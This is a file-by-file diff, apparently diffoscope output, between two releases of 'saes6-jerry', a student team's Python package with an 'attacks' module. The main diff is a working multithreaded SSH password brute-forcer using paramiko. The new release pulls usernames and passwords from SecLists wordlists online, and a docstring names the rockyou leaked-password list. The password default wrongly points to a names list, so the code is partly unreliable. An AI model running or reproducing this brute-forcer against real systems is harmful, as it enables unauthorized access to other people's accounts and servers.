# Comparing `tmp/saes6_jerry-0.1.1.tar.gz` & `tmp/saes6-jerry-0.1.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "saes6_jerry-0.1.1.tar", last modified: Wed May 15 14:52:53 2024, max compression
+gzip compressed data, was "saes6-jerry-0.1.3.tar", last modified: Thu May 16 07:19:21 2024, max compression
```

## Comparing `saes6_jerry-0.1.1.tar` & `saes6-jerry-0.1.3.tar`

### file list

```diff
@@ -1,20 +1,23 @@
-drwxr-xr-x   0 gonzales   (501) staff       (20)        0 2024-05-15 14:52:53.541391 saes6_jerry-0.1.1/
--rw-r--r--   0 gonzales   (501) staff       (20)      370 2024-05-15 14:52:53.541188 saes6_jerry-0.1.1/PKG-INFO
--rw-r--r--   0 gonzales   (501) staff       (20)     2521 2024-05-15 14:40:59.000000 saes6_jerry-0.1.1/README.md
-drwxr-xr-x   0 gonzales   (501) staff       (20)        0 2024-05-15 14:52:53.539359 saes6_jerry-0.1.1/jerry/
--rw-r--r--   0 gonzales   (501) staff       (20)       45 2024-05-15 14:52:51.000000 saes6_jerry-0.1.1/jerry/__init__.py
-drwxr-xr-x   0 gonzales   (501) staff       (20)        0 2024-05-15 14:52:53.539707 saes6_jerry-0.1.1/jerry/attacks/
--rw-r--r--   0 gonzales   (501) staff       (20)        0 2024-05-15 08:19:40.000000 saes6_jerry-0.1.1/jerry/attacks/__init__.py
-drwxr-xr-x   0 gonzales   (501) staff       (20)        0 2024-05-15 14:52:53.540036 saes6_jerry-0.1.1/jerry/attacks/bruteforce/
--rw-r--r--   0 gonzales   (501) staff       (20)        0 2024-05-15 13:26:49.000000 saes6_jerry-0.1.1/jerry/attacks/bruteforce/__init__.py
--rw-r--r--   0 gonzales   (501) staff       (20)     3084 2024-05-15 13:26:49.000000 saes6_jerry-0.1.1/jerry/attacks/bruteforce/bruteforce.py
--rw-r--r--   0 gonzales   (501) staff       (20)     2855 2024-05-15 14:45:05.000000 saes6_jerry-0.1.1/jerry/attacks/sys_infos.py
--rw-r--r--   0 gonzales   (501) staff       (20)     2243 2024-05-15 14:33:24.000000 saes6_jerry-0.1.1/jerry/main.py
-drwxr-xr-x   0 gonzales   (501) staff       (20)        0 2024-05-15 14:52:53.540980 saes6_jerry-0.1.1/saes6_jerry.egg-info/
--rw-r--r--   0 gonzales   (501) staff       (20)      370 2024-05-15 14:52:53.000000 saes6_jerry-0.1.1/saes6_jerry.egg-info/PKG-INFO
--rw-r--r--   0 gonzales   (501) staff       (20)      357 2024-05-15 14:52:53.000000 saes6_jerry-0.1.1/saes6_jerry.egg-info/SOURCES.txt
--rw-r--r--   0 gonzales   (501) staff       (20)        1 2024-05-15 14:52:53.000000 saes6_jerry-0.1.1/saes6_jerry.egg-info/dependency_links.txt
--rw-r--r--   0 gonzales   (501) staff       (20)       43 2024-05-15 14:52:53.000000 saes6_jerry-0.1.1/saes6_jerry.egg-info/entry_points.txt
--rw-r--r--   0 gonzales   (501) staff       (20)        6 2024-05-15 14:52:53.000000 saes6_jerry-0.1.1/saes6_jerry.egg-info/top_level.txt
--rw-r--r--   0 gonzales   (501) staff       (20)       38 2024-05-15 14:52:53.541433 saes6_jerry-0.1.1/setup.cfg
--rw-r--r--   0 gonzales   (501) staff       (20)      657 2024-05-14 09:31:35.000000 saes6_jerry-0.1.1/setup.py
+drwxr-xr-x   0 gonzales   (501) staff       (20)        0 2024-05-16 07:19:21.921362 saes6-jerry-0.1.3/
+-rw-r--r--   0 gonzales   (501) staff       (20)       24 2024-05-15 15:26:21.000000 saes6-jerry-0.1.3/MANIFEST.in
+-rw-r--r--   0 gonzales   (501) staff       (20)      498 2024-05-16 07:19:21.921134 saes6-jerry-0.1.3/PKG-INFO
+-rw-r--r--   0 gonzales   (501) staff       (20)     2521 2024-05-15 14:40:59.000000 saes6-jerry-0.1.3/README.md
+drwxr-xr-x   0 gonzales   (501) staff       (20)        0 2024-05-16 07:19:21.919195 saes6-jerry-0.1.3/jerry/
+-rw-r--r--   0 gonzales   (501) staff       (20)       45 2024-05-16 07:16:59.000000 saes6-jerry-0.1.3/jerry/__init__.py
+drwxr-xr-x   0 gonzales   (501) staff       (20)        0 2024-05-16 07:19:21.919414 saes6-jerry-0.1.3/jerry/attacks/
+-rw-r--r--   0 gonzales   (501) staff       (20)        0 2024-05-15 08:19:40.000000 saes6-jerry-0.1.3/jerry/attacks/__init__.py
+drwxr-xr-x   0 gonzales   (501) staff       (20)        0 2024-05-16 07:19:21.919757 saes6-jerry-0.1.3/jerry/attacks/bruteforce/
+-rw-r--r--   0 gonzales   (501) staff       (20)        0 2024-05-15 13:26:49.000000 saes6-jerry-0.1.3/jerry/attacks/bruteforce/__init__.py
+-rw-r--r--   0 gonzales   (501) staff       (20)     3510 2024-05-16 07:17:49.000000 saes6-jerry-0.1.3/jerry/attacks/bruteforce/bruteforce.py
+-rw-r--r--   0 gonzales   (501) staff       (20)     2855 2024-05-15 14:45:05.000000 saes6-jerry-0.1.3/jerry/attacks/sys_infos.py
+-rw-r--r--   0 gonzales   (501) staff       (20)     2505 2024-05-16 07:16:42.000000 saes6-jerry-0.1.3/jerry/main.py
+-rw-r--r--   0 gonzales   (501) staff       (20)       67 2024-05-15 15:23:09.000000 saes6-jerry-0.1.3/requirements.txt
+drwxr-xr-x   0 gonzales   (501) staff       (20)        0 2024-05-16 07:19:21.920875 saes6-jerry-0.1.3/saes6_jerry.egg-info/
+-rw-r--r--   0 gonzales   (501) staff       (20)      498 2024-05-16 07:19:21.000000 saes6-jerry-0.1.3/saes6_jerry.egg-info/PKG-INFO
+-rw-r--r--   0 gonzales   (501) staff       (20)      420 2024-05-16 07:19:21.000000 saes6-jerry-0.1.3/saes6_jerry.egg-info/SOURCES.txt
+-rw-r--r--   0 gonzales   (501) staff       (20)        1 2024-05-16 07:19:21.000000 saes6-jerry-0.1.3/saes6_jerry.egg-info/dependency_links.txt
+-rw-r--r--   0 gonzales   (501) staff       (20)       43 2024-05-16 07:19:21.000000 saes6-jerry-0.1.3/saes6_jerry.egg-info/entry_points.txt
+-rw-r--r--   0 gonzales   (501) staff       (20)       68 2024-05-16 07:19:21.000000 saes6-jerry-0.1.3/saes6_jerry.egg-info/requires.txt
+-rw-r--r--   0 gonzales   (501) staff       (20)        6 2024-05-16 07:19:21.000000 saes6-jerry-0.1.3/saes6_jerry.egg-info/top_level.txt
+-rw-r--r--   0 gonzales   (501) staff       (20)       38 2024-05-16 07:19:21.921406 saes6-jerry-0.1.3/setup.cfg
+-rw-r--r--   0 gonzales   (501) staff       (20)      863 2024-05-15 15:23:53.000000 saes6-jerry-0.1.3/setup.py
```

### Comparing `saes6_jerry-0.1.1/README.md` & `saes6-jerry-0.1.3/README.md`

 * *Files identical despite different names*

### Comparing `saes6_jerry-0.1.1/jerry/attacks/bruteforce/bruteforce.py` & `saes6-jerry-0.1.3/jerry/attacks/bruteforce/bruteforce.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,13 +1,14 @@
 import paramiko
 import threading
+import requests
 
 NUMBER_OF_THREADS = 1
-USERS_FILE_NAME = './jerry/attacks/bruteforce/users.txt'
-PASSWORDS_FILE_NAME = './jerry/attacks/bruteforce/passwords.txt'
+USERS_FILE_NAME = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt'
+PASSWORDS_FILE_NAME = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt'
 
 """ Bruteforce the target ip with one user and multiple passwords. """
 def bruteForceForOneUser(threadNumber, ip, user, passwords):
     for password in passwords:  # For each password
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
@@ -22,32 +23,40 @@
             print(f"[X] [Thread {threadNumber}] Failed to connect - {user.strip()}:{password.strip()} : {e}")
 
 """ Yield to return successfully chunk from the provided list. """
 def createChunks(myList, numOfChunks):
     for i in range(0, len(myList), numOfChunks):
         yield myList[i:i + numOfChunks]
 
-""" Bruteforce with ip, threads (default 1), usersFileName (default './jerry/attacks/bruteforce/users.txt'), passwordsFileName (default './jerry/attacks/bruteforce/passwords.txt') provided. """
+""" Get file content from local or remote location. """
+def getFileContent(file_path):
+    if file_path.startswith('http://') or file_path.startswith('https://'):  # Remote file
+        response = requests.get(file_path)
+        response.raise_for_status()
+        return response.text.splitlines()
+    else:  # Local file
+        with open(file_path, 'r') as f:
+            return f.readlines()
+
+""" Bruteforce with ip, threads (default 1), usersFileName (default 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt'), passwordsFileName (default 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-30.txt') provided. """
 def bruteforce(ip, threads = NUMBER_OF_THREADS, usersFileName = USERS_FILE_NAME, passwordsFileName =PASSWORDS_FILE_NAME):
     if not ip:
         raise ValueError("[X] ip not provided")
     print(f"[INFO] BruteForce on target {ip} using {threads} thread(s)...")
 
-    with open(usersFileName, "r") as fUsersFile, open(passwordsFileName, "r") as fPasswordsFile: # open files
-        users = fUsersFile.readlines()  # transform the users file into a list
-        passwords = fPasswordsFile.readlines() # transform the passwords file into a list
-        threadsPasswordsList = list(createChunks(passwords, (len(passwords) // threads)))   # create a list of passwords chunks
-        if (len(threadsPasswordsList) > threads):   # if (len(passwords) / threads) don't return an int, This create a last chunk
-            threadsPasswordsList[0].extend(threadsPasswordsList[-1]) # add the last chunk into the first chunk
-            threadsPasswordsList.remove(threadsPasswordsList[-1]) # remove the last chunk
-
-        for user in users:  # for each user
-            threadsList = []
-            for i in range(threads):    # create all the threads
-                thread = threading.Thread(target=bruteForceForOneUser, args=(i+1, ip, user, threadsPasswordsList[i]))
-                threadsList.append(thread)
-                thread.start()
-            
-            for thread in threadsList:  # Wait until all the threads finished
-                thread.join()
+    users = getFileContent(usersFileName)  # Get users
+    passwords = getFileContent(passwordsFileName) # Get passwords
+    threadsPasswordsList = list(createChunks(passwords, (len(passwords) // threads)))   # create a list of passwords chunks
+    if (len(threadsPasswordsList) > threads):   # if (len(passwords) / threads) don't return an int, This create a last chunk
+        threadsPasswordsList[0].extend(threadsPasswordsList[-1]) # add the last chunk into the first chunk
+        threadsPasswordsList.remove(threadsPasswordsList[-1]) # remove the last chunk
+    for user in users:  # for each user
+        threadsList = []
+        for i in range(threads):    # create all the threads
+            thread = threading.Thread(target=bruteForceForOneUser, args=(i+1, ip, user, threadsPasswordsList[i]))
+            threadsList.append(thread)
+            thread.start()
+        
+        for thread in threadsList:  # Wait until all the threads finished
+            thread.join()
 
     print("[INFO] BruteForce finished.")
```

### Comparing `saes6_jerry-0.1.1/jerry/attacks/sys_infos.py` & `saes6-jerry-0.1.3/jerry/attacks/sys_infos.py`

 * *Files identical despite different names*

### Comparing `saes6_jerry-0.1.1/setup.py` & `saes6-jerry-0.1.3/setup.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,22 +1,27 @@
 from setuptools import setup, find_packages
+from pip._internal.req import parse_requirements
 
 from jerry import __version__
 
+install_reqs = parse_requirements('./requirements.txt', session='dummy')
+reqs = [str(ir.requirement) for ir in install_reqs]
+
 setup(
     name='saes6-jerry',
     version=__version__,
     description='SAE S6 Equipe 2 - jerry.',
 
     url='https://gitlab.com/LennyGonzales/saes6-equipe2-jerry',
     author='GANASSI-GONZALES-SAADI-SAUVA',
     author_email='lenny.gonzales@etu.univ-amu.fr',
 
     packages=find_packages(),
-
+    install_requires=reqs,
+    
     extras_require={},
 
     entry_points={
         'console_scripts': [
             'saes6-jerry = jerry:main',
         ],
     },
```

